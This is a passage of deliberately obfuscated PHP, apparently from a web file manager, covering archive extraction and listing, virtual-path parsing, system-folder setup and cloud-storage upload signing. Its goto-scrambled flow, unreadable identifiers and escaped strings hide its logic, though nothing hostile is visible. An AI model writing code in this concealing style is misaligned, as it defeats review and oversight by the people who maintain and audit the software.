(!($a¯‰ é¿„× = parent::info($f…÷ÀøØ¯„))) { show_json(LNG($BèÒò˜íã›[1048]), !1); } if (!($aŸ­ùä´º¤ = parent::infoFull($a‹Ï¢ÁÔÑ))) { $a‹Ï¢ÁÔÑ = parent::mkdir($a‹Ï¢ÁÔÑ); $aŸ­ùä´º¤ = array($BèÒò˜íã›[75] => $a‹Ï¢ÁÔÑ); } else { if (isset($aŸ­ùä´º¤[$BèÒò˜íã›[369]]) && trim($aŸ­ùä´º¤[$BèÒò˜íã›[75]], $BèÒò˜íã›[8]) != trim($a‹Ï¢ÁÔÑ, $BèÒò˜íã›[8])) { $eÂ»–¶âåù = KodIO::make($aŸ­ùä´º¤[$BèÒò˜íã›[463]]); $fôƒÀ¼Ö×„ = parent::fileNameAuto($eÂ»–¶âåù, $aŸ­ùä´º¤[$BèÒò˜íã›[28]], REPEAT_RENAME_FOLDER, !0); $a‹Ï¢ÁÔÑ = parent::mkdir($eÂ»–¶âåù . $fôƒÀ¼Ö×„); $aŸ­ùä´º¤ = array($BèÒò˜íã›[75] => $a‹Ï¢ÁÔÑ); } } $a‹Ï¢ÁÔÑ = $aŸ­ùä´º¤[$BèÒò˜íã›[75]]; goto D’¿ŞìÉí½; A¹šôĞÃ: Hook::trigger($BèÒò˜íã›[1054], $a¦××‰Øœ); recursion_dir($a¦××‰Øœ, $E§åĞ×«õ, $Få§°ÖËÄ¾, 0); $f‘îïòù²Ñ = array_merge($E§åĞ×«õ, $Få§°ÖËÄ¾); goto dùî„ªÕï«; dùî„ªÕï«: foreach ($f‘îïòù²Ñ as $d£ìµ¼µ‚å) { $d£ìµ¼µ‚å = self::iconvApp($d£ìµ¼µ‚å); self::move($d£ìµ¼µ‚å, $a‹Ï¢ÁÔÑ, $a÷Õ¦í˜Äô); } del_dir($a¦××‰Øœ); if (!$CÓö§¶Îà¡) { del_file($dİÒâáŒ’ñ); } goto A‡¢Æê³ì; bÏ²Ä¹óÏ: $bÌ«Æ´¥Ñ‰ = KodArchive::extract($dİÒâáŒ’ñ, $a¦××‰Øœ . $BèÒò˜íã›[8], $d¯×â§øŠ); self::archiveExt(); if (!$bÌ«Æ´¥Ñ‰[$BèÒò˜íã›[1051]]) { show_json($BèÒò˜íã›[1052] . $bÌ«Æ´¥Ñ‰[$BèÒò˜íã›[1053]], !1); } goto A¹šôĞÃ; Dš³ªğÄ•: } public static function unzipList($A‘–êá®’Ò) { goto e˜ŞƒÙåëö; F¡Â³É»: $bÄ¢êƒª¢ = 50000; if (request_url_safe($cİ«—ğ‹‚ì)) { $D¹É•‡ç»  = parse_url_query($cİ«—ğ‹‚ì); if (!isset($D¹É•‡ç» [$AÄôäƒì¼[75]])) { show_json($AÄôäƒì¼[1056], !1); } } $E°—Ä¦Ôœ = isset($D¹É•‡ç» ) ? $D¹É•‡ç» [$AÄôäƒì¼[75]] : $cİ«—ğ‹‚ì; goto D›Ñ£±Âà; D›Ñ£±Âà: $bÓãˆàÛ÷± = self::info($E°—Ä¦Ôœ); $b©‚…¨­ä¼ = self::fileExt($bÓãˆàÛ÷±); $bå¢»Œíãö = self::tmpFileName($bÓãˆàÛ÷±); goto d¤Ê´›¦Š™; C×êÔ†åÇ : $DÕ‚Šƒ¹ã = json_encode($a¸÷ôßñ Í[$AÄôäƒì¼[1053]]); self::setContent($DîÉ›¬ŒÆ, $DÕ‚Šƒ¹ã); if (count($a¸÷ôßñ Í[$AÄôäƒì¼[1053]]) >= $bÄ¢êƒª¢) { show_json(sprintf(LNG($AÄôäƒì¼[1057]), count($a¸÷ôßñ Í[$AÄôäƒì¼[1053]])), !1); } goto aç†ˆ‰±É; d¤Ê´›¦Š™: if (isset($D¹É•‡ç» )) { $b‚Ä‹§–ù = array($D¹É•‡ç» [$AÄôäƒì¼[75]], $D¹É•‡ç» [$AÄôäƒì¼[1055]], $D¹É•‡ç» [$AÄôäƒì¼[28]]); $EŒ…ÜÇâ±¡ = md5(implode($AÄôäƒì¼[70], $b‚Ä‹§–ù)) . $AÄôäƒì¼[91] . get_path_ext($D¹É•‡ç» [$AÄôäƒì¼[28]]); } else { $b‚Ä‹§–ù = array($bÓãˆàÛ÷±[$AÄôäƒì¼[28]], $bÓãˆàÛ÷±[$AÄôäƒì¼[75]], $bÓãˆàÛ÷±[$AÄôäƒì¼[77]]); $EŒ…ÜÇâ±¡ = md5(implode($AÄôäƒì¼[70], $b‚Ä‹§–ù)) . $AÄôäƒì¼[91] . $b©‚…¨­ä¼; } if ($e™«¹òâ‘• == -1) { $DîÉ›¬ŒÆ = IO_PATH_SYSTEM_TEMP . "\x7a\151\160\x56\x69\x65\167\57{$bå¢»Œíãö}\x2f{$EŒ…ÜÇâ±¡}\x2e\x6c\x6f\147"; $E³Ñ…Éİ© = self::infoFull($DîÉ›¬ŒÆ); if ($E³Ñ…Éİ©) { $DîÉ›¬ŒÆ = $E³Ñ…Éİ©[$AÄôäƒì¼[75]]; $fÉñ»÷„Ÿ = self::getContent($DîÉ›¬ŒÆ); if ($fÉñ»÷„Ÿ) { $DÕ‚Šƒ¹ã = json_decode($fÉñ»÷„Ÿ, !0); if (count($DÕ‚Šƒ¹ã) >= $bÄ¢êƒª¢) { show_json(sprintf(LNG($AÄôäƒì¼[1057]), count($DÕ‚Šƒ¹ã)), !1); } return $DÕ‚Šƒ¹ã; } } else { $DîÉ›¬ŒÆ = self::mkfile($DîÉ›¬ŒÆ); } } $b¦¼å–ÈË = TEMP_FILES . $bå¢»Œíãö; goto eÃ¹²ä¢Ñ; eÃ¹²ä¢Ñ: if (!is_dir($b¦¼å–ÈË)) { mk_dir($b¦¼å–ÈË); } $càñªô«Ò = $b¦¼å–ÈË . $AÄôäƒì¼[8] . $EŒ…ÜÇâ±¡; if (!@file_exists(self::iconvSystem($càñªô«Ò))) { if (isset($D¹É•‡ç» )) { url_request($cİ«—ğ‹‚ì, $AÄôäƒì¼[1058], $càñªô«Ò); } else { $F¹íøÜâ–™ = self::localFilePath($cİ«—ğ‹‚ì, $b©‚…¨­ä¼); $càñªô«Ò = $F¹íøÜâ–™ ? $F¹íøÜâ–™ : self::download($cİ«—ğ‹‚ì, $càñªô«Ò); } } goto d¯ì³Ä¤¸; Dƒ¸ĞÈ†“: self::archiveExt(); del_dir($b¦¼å–ÈË); if (!$a¸÷ôßñ Í[$AÄôäƒì¼[1051]]) { show_json($a¸÷ôßñ Í[$AÄôäƒì¼[1053]], !1); } goto C×êÔ†åÇ ; d¯ì³Ä¤¸: $càñªô«Ò = self::iconvSystem($càñªô«Ò); if ($e™«¹òâ‘• >= 0) { $CÓ³Ï‹ğ = isset($A‘–êá®’Ò[$AÄôäƒì¼[1059]]) ? $A‘–êá®’Ò[$AÄôäƒì¼[1059]] : !1; $få¾ˆ­øÚ = isset($A‘–êá®’Ò[$AÄôäƒì¼[28]]) ? $A‘–êá®’Ò[$AÄôäƒì¼[28]] : $AÄôäƒì¼[33]; KodArchive::filePreview($càñªô«Ò, $e™«¹òâ‘•, $CÓ³Ï‹ğ, $få¾ˆ­øÚ); self::archiveExt(); die; } $a¸÷ôßñ Í = KodArchive::listContent($càñªô«Ò); goto Dƒ¸ĞÈ†“; aç†ˆ‰±É: return $a¸÷ôßñ Í[$AÄôäƒì¼[1053]]; goto bÈ‘à‘„ÜÌ; e˜ŞƒÙåëö: $AÄôäƒì¼ =& $_SERVER[ã®Â„Éæ¹¤]; $cİ«—ğ‹‚ì = $A‘–êá®’Ò[$AÄôäƒì¼[75]]; $e™«¹òâ‘• = isset($A‘–êá®’Ò[$AÄôäƒì¼[1055]]) ? $A‘–êá®’Ò[$AÄôäƒì¼[1055]] : -1; goto F¡Â³É»; bÈ‘à‘„ÜÌ: } private static function fileExt($Cãˆ·†ä»ï) { $E…Ó½Ç•Œ™ =& $_SERVER[ã®Â„Éæ¹¤]; $fÊªìÇ˜® = $Cãˆ·†ä»ï[$E…Ó½Ç•Œ™[160]]; if ($fÊªìÇ˜® == $E…Ó½Ç•Œ™[1060]) { $E•ÆŸ·ø†» = $E…Ó½Ç•Œ™[1061]; if (substr($Cãˆ·†ä»ï[$E…Ó½Ç•Œ™[28]], -strlen($E•ÆŸ·ø†»)) == $E•ÆŸ·ø†») { $fÊªìÇ˜® = $E…Ó½Ç•Œ™[1062]; } } self::archiveExt($fÊªìÇ˜®); return $fÊªìÇ˜®; } private static function zipFileList($D¿ï¦””, $bÃ„§´…‡¸ = false) { $dµ£×ô·ØŞ =& $_SERVER[ã®Â„Éæ¹¤]; $BÂ¸¢Úƒ‰æ = array(); foreach ($D¿ï¦”” as $Fê’è•ÏÈ) { $e¢ìÚÔ¯¯ = $Fê’è•ÏÈ[$dµ£×ô·ØŞ[75]]; if ($bÃ„§´…‡¸) { $e¢ìÚÔ¯¯ = self::copy($Fê’è•ÏÈ[$dµ£×ô·ØŞ[75]], $bÃ„§´…‡¸, $dµ£×ô·ØŞ[767]); } else { $E½·÷¬õÖ” = self::init($Fê’è•ÏÈ[$dµ£×ô·ØŞ[75]]); if ($E½·÷¬õÖ”->getType() == $dµ£×ô·ØŞ[102]) { $e¢ìÚÔ¯¯ = $E½·÷¬õÖ”->path; } } if ($e¢ìÚÔ¯¯ && self::local()->exist($e¢ìÚÔ¯¯)) { $BÂ¸¢Úƒ‰æ[$Fê’è•ÏÈ[$dµ£×ô·ØŞ[75]]] = $e¢ìÚÔ¯¯; } } if (!empty($BÂ¸¢Úƒ‰æ)) { return array_values($BÂ¸¢Úƒ‰æ); } show_json(LNG($dµ£×ô·ØŞ[1063]), !1); } public static function tmpFileName($bÎˆ™Ì˜àô) { $EÔ¨˜×µ‘í =& $_SERVER[ã®Â„Éæ¹¤]; $dï¨âÏ¨èì = array($bÎˆ™Ì˜àô[$EÔ¨˜×µ‘í[28]], $bÎˆ™Ì˜àô[$EÔ¨˜×µ‘í[75]], $bÎˆ™Ì˜àô[$EÔ¨˜×µ‘í[77]], $bÎˆ™Ì˜àô[$EÔ¨˜×µ‘í[461]]); return md5(implode($EÔ¨˜×µ‘í[70], $dï¨âÏ¨èì)); } private static function localFilePath($E¸ƒµ—­‰İ, $F˜Óáƒ·Çî) { goto D¤ÏİñÙàŸ; CéÍ®¾íÚ°: if ($BŒİîº’±š == $C†‰Ä¿‰Ù[102] || $BŒİîº’±š == $C†‰Ä¿‰Ù[1067]) { if (!$d£İÙè¬¨->exist($d£İÙè¬¨->path)) { show_json(LNG($C†‰Ä¿‰Ù[101]), !1); } return $d£İÙè¬¨->path; } return !1; goto DÓÑ¤ÖùĞ; A¢ƒšÈ»Ù: if ($a²ª˜”É£ˆ[$C†‰Ä¿‰Ù[29]] == KodIO::KOD_SOURCE) { $F®‰¥öó™ = Model($C†‰Ä¿‰Ù[775])->fileInfoGet(KodIO::sourceID($E¸ƒµ—­‰İ)); if (!$F®‰¥öó™[$C†‰Ä¿‰Ù[75]]) { show_json($C†‰Ä¿‰Ù[1066], !1); } $E¸ƒµ—­‰İ = $F®‰¥öó™[$C†‰Ä¿‰Ù[75]]; } $d£İÙè¬¨ = self::init($E¸ƒµ—­‰İ); $BŒİîº’±š = $d£İÙè¬¨->getType(); goto CéÍ®¾íÚ°; D¤ÏİñÙàŸ: $C†‰Ä¿‰Ù =& $_SERVER[ã®Â„Éæ¹¤]; if ($F˜Óáƒ·Çî == $C†‰Ä¿‰Ù[1064] && strtoupper(substr(PHP_OS, 0, 3)) == $C†‰Ä¿‰Ù[1065]) { return !1; } $a²ª˜”É£ˆ = KodIO::parse($E¸ƒµ—­‰İ); goto A¢ƒšÈ»Ù; DÓÑ¤ÖùĞ: } private static function archiveExt($eÓø‘İ§¯Ù = '') { $GLOBALS[$_SERVER[ã®Â„Éæ¹¤][1068]] = $eÓø‘İ§¯Ù; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\x72\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\162\122\x65\143\x79\143\154\145\x7d"; const KOD_USER_FAV = "\x7b\165\x73\x65\x72\106\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\162\x46\x69\154\x65\124\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\162\x46\x69\x6c\145\x54\171\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\x6f\165\160\122\157\x6f\164\123\x65\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\162\x53\150\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\x72\123\x68\x61\162\145\114\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\141\162\145\124\157\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\x72\145\111\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\x72\x65\111\x74\x65\x6d\x4c\x69\x6e\153\x7d"; const KOD_SEARCH = "\173\x73\145\x61\x72\143\150\x7d"; const KOD_BLOCK = "\173\142\x6c\157\143\153\x7d"; const KOD_IO = "\173\151\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\x65\x72\122\x65\156\143\x65\156\164\175"; const KOD_USER_DRIVER = "\173\x64\162\x69\x76\x65\162\x7d"; public static function typeList() { $Fî±Æâ½²‹ =& $_SERVER[ã®Â„Éæ¹¤]; return array($Fî±Æâ½²‹[1069] => self::KOD_SOURCE, $Fî±Æâ½²‹[1070] => self::KOD_USER_RECYCLE, $Fî±Æâ½²‹[1071] => self::KOD_USER_FAV, $Fî±Æâ½²‹[1072] => self::KOD_USER_FILE_TAG, $Fî±Æâ½²‹[1073] => self::KOD_USER_FILE_TYPE, $Fî±Æâ½²‹[1074] => self::KOD_GROUP_ROOT_SELF, $Fî±Æâ½²‹[1075] => self::KOD_USER_SHARE, $Fî±Æâ½²‹[1076] => self::KOD_USER_SHARE_LINK, $Fî±Æâ½²‹[1077] => self::KOD_USER_SHARE_TO_ME, $Fî±Æâ½²‹[1078] => self::KOD_SHARE_ITEM, $Fî±Æâ½²‹[1079] => self::KOD_SHARE_LINK, $Fî±Æâ½²‹[1080] => self::KOD_SEARCH, $Fî±Æâ½²‹[1081] => self::KOD_BLOCK, $Fî±Æâ½²‹[1082] => self::KOD_IO, $Fî±Æâ½²‹[1083] => self::KOD_USER_RECENT, $Fî±Æâ½²‹[1084] => self::KOD_USER_DRIVER); } public static function parse($b‰‘¦Ú‰Ù¦) { goto FÅ¡‡®Ÿ; Dì¨œİÆÇ: $a¾×À¶Ñ¸ = array($eÅ¸·Š´Ğ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $B×š°÷Íæ¾[$eÅ¸·Š´Ğ[1089]] = in_array($B×š°÷Íæ¾[$eÅ¸·Š´Ğ[29]], $a¾×À¶Ñ¸); return $B×š°÷Íæ¾; goto eÎ“´×Îáš; b®‰‹²ÀÆ•: preg_match($eÅ¸·Š´Ğ[1085], $b‰‘¦Ú‰Ù¦, $bŞŒ¦ÛÙ›); $B×š°÷Íæ¾ = array($eÅ¸·Š´Ğ[388] => !1, $eÅ¸·Š´Ğ[1086] => !1, $eÅ¸·Š´Ğ[385] => !1, $eÅ¸·Š´Ğ[75] => $b‰‘¦Ú‰Ù¦, $eÅ¸·Š´Ğ[1032] => !1, $eÅ¸·Š´Ğ[1031] => $eÅ¸·Š´Ğ[33]); if (is_array($bŞŒ¦ÛÙ›) && count($bŞŒ¦ÛÙ›) == 5) { $e¡ïµîß = $eÅ¸·Š´Ğ[1087] . $bŞŒ¦ÛÙ›[2] . $eÅ¸·Š´Ğ[315]; if (in_array($e¡ïµîß, $CÃÕé×£«ë)) { $B×š°÷Íæ¾[$eÅ¸·Š´Ğ[1032]] = $bŞŒ¦ÛÙ›[1]; $B×š°÷Íæ¾[$eÅ¸·Š´Ğ[29]] = $e¡ïµîß; $B×š°÷Íæ¾[$eÅ¸·Š´Ğ[1088]] = substr($e¡ïµîß, 1, -1); $B×š°÷Íæ¾[$eÅ¸·Š´Ğ[367]] = $bŞŒ¦ÛÙ›[3]; } $B×š°÷Íæ¾[$eÅ¸·Š´Ğ[1031]] = $bŞŒ¦ÛÙ›[4]; } goto Dì¨œİÆÇ; FÅ¡‡®Ÿ: $eÅ¸·Š´Ğ =& $_SERVER[ã®Â„Éæ¹¤]; $b‰‘¦Ú‰Ù¦ = self::clear($b‰‘¦Ú‰Ù¦); $CÃÕé×£«ë = array_values(self::typeList()); goto b®‰‹²ÀÆ•; eÎ“´×Îáš: } public static function clear($AùŠ“ç¦Éê) { goto FÎ…Œ‰Œ•„; Bß‚ÁğÂÏ: $AùŠ“ç¦Éê = preg_replace($CàÄ‘ò[1092], $CàÄ‘ò[8], $AùŠ“ç¦Éê); if ($AùŠ“ç¦Éê == $CàÄ‘ò[8]) { return $CàÄ‘ò[8]; } $AùŠ“ç¦Éê = rtrim($AùŠ“ç¦Éê, $CàÄ‘ò[8]); goto a‚È©óÓö; b¨š¡ƒ: $AÉ¤Ï¹Şó­ = $CàÄ‘ò[1090]; if (substr($AùŠ“ç¦Éê, 0, 3) == $CàÄ‘ò[1091]) { $AùŠ“ç¦Éê = substr($AùŠ“ç¦Éê, 3); } while (strstr($AùŠ“ç¦Éê, $AÉ¤Ï¹Şó­)) { $AùŠ“ç¦Éê = str_replace($AÉ¤Ï¹Şó­, $CàÄ‘ò[8], $AùŠ“ç¦Éê); } goto Bß‚ÁğÂÏ; FÎ…Œ‰Œ•„: $CàÄ‘ò =& $_SERVER[ã®Â„Éæ¹¤]; $AùŠ“ç¦Éê = str_replace(array($CàÄ‘ò[1011], $CàÄ‘ò[217]), $CàÄ‘ò[50], $AùŠ“ç¦Éê); $AùŠ“ç¦Éê = str_replace($CàÄ‘ò[93], $CàÄ‘ò[8], $AùŠ“ç¦Éê); goto b¨š¡ƒ; a‚È©óÓö: return $AùŠ“ç¦Éê; goto a…÷’Êàè²; a…÷’Êàè²: } public static function sourceID($FäÃÅÅ¿«Ş) { $fˆ¦¸áİÄñ =& $_SERVER[ã®Â„Éæ¹¤]; $Fš˜°ÍÔâ  = self::parse($FäÃÅÅ¿«Ş); if ($Fš˜°ÍÔâ [$fˆ¦¸áİÄñ[29]] !== self::KOD_SOURCE) { show_json(LNG($fˆ¦¸áİÄñ[1093]), !1); } return $Fš˜°ÍÔâ [$fˆ¦¸áİÄñ[367]]; } public static function make($B„ø“ïŠ) { if (!$B„ø“ïŠ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($B„ø“ïŠ)); } public static function makeShare($EßÛ›£´‚º, $Eùñ‡†ÕÖÑ) { return self::makePath(self::KOD_SHARE_ITEM, $EßÛ›£´‚º, $Eùñ‡†ÕÖÑ); } public static function makeFileTypePath($bğ´ßåããÉ) { return self::makePath(self::KOD_USER_FILE_TYPE, $bğ´ßåããÉ); } public static function makeFileTagPath($DğŠã˜ˆ) { return self::makePath(self::KOD_USER_FILE_TAG, $DğŠã˜ˆ); } public static function makePath($eÄß¸æ¬Î, $D†ãâÅ’çª = '', $fß²ŞÚ«‚ = '') { $Fˆ‰‚•ÊÚµ =& $_SERVER[ã®Â„Éæ¹¤]; $DØ«Ûùµ = substr($eÄß¸æ¬Î, 1, -1); $DªçÅÃ¶Ç = $Fˆ‰‚•ÊÚµ[1094] . $DØ«Ûùµ . $Fˆ‰‚•ÊÚµ[1095] . $D†ãâÅ’çª . $Fˆ‰‚•ÊÚµ[1096]; $DªçÅÃ¶Ç = $fß²ŞÚ«‚ ? $DªçÅÃ¶Ç . $fß²ŞÚ«‚ . $Fˆ‰‚•ÊÚµ[8] : $DªçÅÃ¶Ç; return $DªçÅÃ¶Ç; } public static function hashPath($bÆê„§Ù„) { $CÜ¹›Ş·†» =& $_SERVER[ã®Â„Éæ¹¤]; $FÇ¡«¬Ö¹´ = is_array($bÆê„§Ù„) ? $bÆê„§Ù„ : IO::info($bÆê„§Ù„); $CØÑ©öê‚Ö = _get($FÇ¡«¬Ö¹´, $CÜ¹›Ş·†»[1097], $CÜ¹›Ş·†»[33]); if (!$CØÑ©öê‚Ö) { $eˆ¥é‹…“¹ = KodIO::parse($FÇ¡«¬Ö¹´[$CÜ¹›Ş·†»[75]]); if (!$eˆ¥é‹…“¹[$CÜ¹›Ş·†»[29]]) { $CØÑ©öê‚Ö = IO::hashSimple($FÇ¡«¬Ö¹´[$CÜ¹›Ş·†»[75]]); } } if (!$CØÑ©öê‚Ö) { $CØÑ©öê‚Ö = md5($FÇ¡«¬Ö¹´[$CÜ¹›Ş·†»[75]] . $FÇ¡«¬Ö¹´[$CÜ¹›Ş·†»[77]] . $FÇ¡«¬Ö¹´[$CÜ¹›Ş·†»[107]]); } return $CØÑ©öê‚Ö; } public static function initSystemPath() { $C¸§ãŠƒ¼’ =& $_SERVER[ã®Â„Éæ¹¤]; if (defined($C¸§ãŠƒ¼’[1098])) { return; } define($C¸§ãŠƒ¼’[1098], self::systemPath($C¸§ãŠƒ¼’[1099])); define($C¸§ãŠƒ¼’[1100], self::systemPath($C¸§ãŠƒ¼’[1101])); define($C¸§ãŠƒ¼’[1102], self::systemPath($C¸§ãŠƒ¼’[1103])); define($C¸§ãŠƒ¼’[1104], self::systemPath($C¸§ãŠƒ¼’[1105])); } public static function systemPath($F›èÑ¨ò¡±) { goto f¢¯ÇåœÒÁ; aÏ‹ÛÑùë: if ($bõµ›Úñ†) { return $bõµ›Úñ†; } if ($F›èÑ¨ò¡± == $Eó‚ùÃè¦ê[1099]) { $bõµ›Úñ† = self::make(Model($Eó‚ùÃè¦ê[775])->systemRootPathAdd($Eó‚ùÃè¦ê[1108])); } else { $bõµ›Úñ† = self::systemPath($Eó‚ùÃè¦ê[1099]); $Fë¡ÁÕÙÂÑ = self::sourceID($bõµ›Úñ†); $bõµ›Úñ† = self::make(Model($Eó‚ùÃè¦ê[775])->mkdir($Fë¡ÁÕÙÂÑ, $F›èÑ¨ò¡±)); } Model($Eó‚ùÃè¦ê[1107])->set($b“çÒ±öİ, $bõµ›Úñ†); goto FŒôğ¹Ú±; f¢¯ÇåœÒÁ: $Eó‚ùÃè¦ê =& $_SERVER[ã®Â„Éæ¹¤]; $b“çÒ±öİ = $Eó‚ùÃè¦ê[1106] . ucfirst($F›èÑ¨ò¡±); $bõµ›Úñ† = Model($Eó‚ùÃè¦ê[1107])->get($b“çÒ±öİ); goto aÏ‹ÛÑùë; FŒôğ¹Ú±: return $bõµ›Úñ†; goto b¶«¹¾·ŠŸ; b¶«¹¾·ŠŸ: } public static function systemFolder($dÆßğ ã¬à) { $a¾âåáÉåÑ = IO_PATH_SYSTEM_SOURCE . $dÆßğ ã¬à; $c§ÎÄ†Œ‹© = Cache::get($a¾âåáÉåÑ); if (!$c§ÎÄ†Œ‹©) { $d—Øø–ƒ¢õ = IO::infoFull($a¾âåáÉåÑ); if (!$d—Øø–ƒ¢õ) { $c§ÎÄ†Œ‹© = IO::mkdir($a¾âåáÉåÑ, REPEAT_SKIP); } else { $c§ÎÄ†Œ‹© = $d—Øø–ƒ¢õ[$_SERVER[ã®Â„Éæ¹¤][75]]; } Cache::set($a¾âåáÉåÑ, $c§ÎÄ†Œ‹©, 3600 * 10); } return $c§ÎÄ†Œ‹©; } public static function defaultDriver() { return Model($_SERVER[ã®Â„Éæ¹¤][725])->defaultDriver(); } public static function defaultIO() { $E¤ª÷ëÇ”¶ =& $_SERVER[ã®Â„Éæ¹¤]; $Cµ£Ææèõö = self::defaultDriver(); return $E¤ª÷ëÇ”¶[1109] . $Cµ£Ææèõö[$E¤ª÷ëÇ”¶[367]] . $E¤ª÷ëÇ”¶[1096]; } public static function defaultDriverInit() { static $E¯ñ¦¬¼Ç× = false; if ($E¯ñ¦¬¼Ç×) { return $E¯ñ¦¬¼Ç×; } $E¯ñ¦¬¼Ç× = IO::init(self::defaultIO()); return $E¯ñ¦¬¼Ç×; } public static function fileTypeList() { $aëçÔµí’» =& $_SERVER[ã®Â„Éæ¹¤]; $A÷¸”ĞíùÈ = $GLOBALS[$aëçÔµí’»[6]][$aëçÔµí’»[1110]]; foreach ($A÷¸”ĞíùÈ as $A–ÅŞ£‰ => $e˜‚Ïá¯) { $eƒÁñ”í’Å = $aëçÔµí’»[1111] . $A–ÅŞ£‰; $cÌ•¡£¹¨Î = LNG($eƒÁñ”í’Å); if ($eƒÁñ”í’Å != $cÌ•¡£¹¨Î) { $A÷¸”ĞíùÈ[$A–ÅŞ£‰][$aëçÔµí’»[28]] = $cÌ•¡£¹¨Î; } } return $A÷¸”ĞíùÈ; } public static function transferType($eÖÉ·º£§À, $aĞ†êŒ‘•) { goto fªä‹”ß²Â; fªä‹”ß²Â: $DóÆîƒšõš =& $_SERVER[ã®Â„Éæ¹¤]; $F­âØ’°È = self::driverType($eÖÉ·º£§À); $dÚï·Œä®Ö = self::driverType($aĞ†êŒ‘•); goto e•Ê¶·„˜í; e•Ê¶·„˜í: if ($F­âØ’°È[$DóÆîƒšõš[29]] == $dÚï·Œä®Ö[$DóÆîƒšõš[29]] && $F­âØ’°È[$DóÆîƒšõš[1112]] == $dÚï·Œä®Ö[$DóÆîƒšõš[1112]]) { return $DóÆîƒšõš[1113]; } if ($F­âØ’°È[$DóÆîƒšõš[29]] == $DóÆîƒšõš[805] && $dÚï·Œä®Ö[$DóÆîƒšõš[29]] == $DóÆîƒšõš[102]) { return $DóÆîƒšõš[1059]; } if ($F­âØ’°È[$DóÆîƒšõš[29]] == $DóÆîƒšõš[102] && $dÚï·Œä®Ö[$DóÆîƒšõš[29]] == $DóÆîƒšõš[805]) { return $DóÆîƒšõš[103]; } goto a‰ÓÕŠœ¥Œ; a‰ÓÕŠœ¥Œ: return $DóÆîƒšõš[1114]; goto aŞ›£‹•ĞË; aŞ›£‹•ĞË: } public static function driverType($FØ·Ù²’º×) { goto b„„ä¸´Óˆ; b„„ä¸´Óˆ: $DÓÁ’§…¥² =& $_SERVER[ã®Â„Éæ¹¤]; $cÇêùÚÌØ = $FØ·Ù²’º×->path; $B‡öÇš‚âù = str_replace($DÓÁ’§…¥²[1115], $DÓÁ’§…¥²[33], strtolower($FØ·Ù²’º×->getType())); goto E§è…ø’; fœÙ´Íæ¡‰: return array($DÓÁ’§…¥²[29] => $DÓÁ’§…¥²[805], $DÓÁ’§…¥²[1112] => $FØ·Ù²’º×->pathDriver, $DÓÁ’§…¥²[75] => $cÇêùÚÌØ); goto b¥ò”öƒ‚´; E§è…ø’: if ($B‡öÇš‚âù == $DÓÁ’§…¥²[716] || $B‡öÇš‚âù == $DÓÁ’§…¥²[1116] || $B‡öÇš‚âù == $DÓÁ’§…¥²[1117]) { $FØ·Ù²’º× = self::defaultDriverInit(); } else { if ($B‡öÇš‚âù == $DÓÁ’§…¥²[1067] || $B‡öÇš‚âù == $DÓÁ’§…¥²[1118]) { $FØ·Ù²’º× = IO::init($FØ·Ù²’º×->pathParse[$DÓÁ’§…¥²[1017]]); } } $B‡öÇš‚âù = str_replace($DÓÁ’§…¥²[1115], $DÓÁ’§…¥²[33], strtolower($FØ·Ù²’º×->getType())); if ($B‡öÇš‚âù == $DÓÁ’§…¥²[102]) { return array($DÓÁ’§…¥²[29] => $DÓÁ’§…¥²[102], $DÓÁ’§…¥²[1112] => $DÓÁ’§…¥²[33], $DÓÁ’§…¥²[75] => $cÇêùÚÌØ); } goto fœÙ´Íæ¡‰; b¥ò”öƒ‚´: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($D×÷èÁÜ‘) { parent::__construct($D×÷èÁÜ‘); $this->signatureVersion($_SERVER[ã®Â„Éæ¹¤][200]); } public function uploadFormData($DÒ¶Ş¤è, $cëÆùóËÚ¨ = 3600) { goto AŠ“ŸÌÏÃƒ; c½Ëğ×éŒÔ: return $D„ùï„õ·ó; goto bÖœ¶µ‘„„; c‡Ñªˆù¾¥: $fƒ¬ŸÊ©Ö = $a”š£¨à½ƒ[1119]; $fŠâò“‘Ÿ¾ = gmdate($a”š£¨à½ƒ[1120], time() + $cëÆùóËÚ¨); $AÍ—’»¢í = (string) time() . $a”š£¨à½ƒ[67] . (string) (time() + $cëÆùóËÚ¨); goto FŒ‘¹Ş¹‹Ÿ; FŒ‘¹Ş¹‹Ÿ: $Bæ›­±è¥£ = array($a”š£¨à½ƒ[1121] => $fŠâò“‘Ÿ¾, $a”š£¨à½ƒ[1122] => array(array($a”š£¨à½ƒ[1123] => $EÄ·•ê°£—), array($a”š£¨à½ƒ[1124] => $this->bucket), array($a”š£¨à½ƒ[1125], $a”š£¨à½ƒ[1126], $a”š£¨à½ƒ[33]), array($a”š£¨à½ƒ[1127] => $fƒ¬ŸÊ©Ö), array($a”š£¨à½ƒ[1128] => $DĞˆ‡ ùº¿), array($a”š£¨à½ƒ[1129] => $this->accessKey), array($a”š£¨à½ƒ[1130] => $AÍ—’»¢í))); $Bæ›­±è¥£ = json_encode($Bæ›­±è¥£); $E¹›Ø¾¹²™ = hash_hmac($a”š£¨à½ƒ[218], $AÍ—’»¢í, $this->secret); goto b÷Óæ†™à; b÷Óæ†™à: $FÊÑ‡éê = sha1($Bæ›­±è¥£); $b´Ç†½ = hash_hmac($a”š£¨à½ƒ[218], $FÊÑ‡éê, $E¹›Ø¾¹²™); $D„ùï„õ·ó = array($a”š£¨à½ƒ[1123] => $EÄ·•ê°£—, $a”š£¨à½ƒ[1127] => $fƒ¬ŸÊ©Ö, $a”š£¨à½ƒ[1131] => base64_encode($Bæ›­±è¥£), $a”š£¨à½ƒ[1128] => $DĞˆ‡ ùº¿, $a”š£¨à½ƒ[1129] => $this->accessKey, $a”š£¨à½ƒ[1132] => $AÍ—’»¢í, $a”š£¨à½ƒ[1133] => $b´Ç†½, 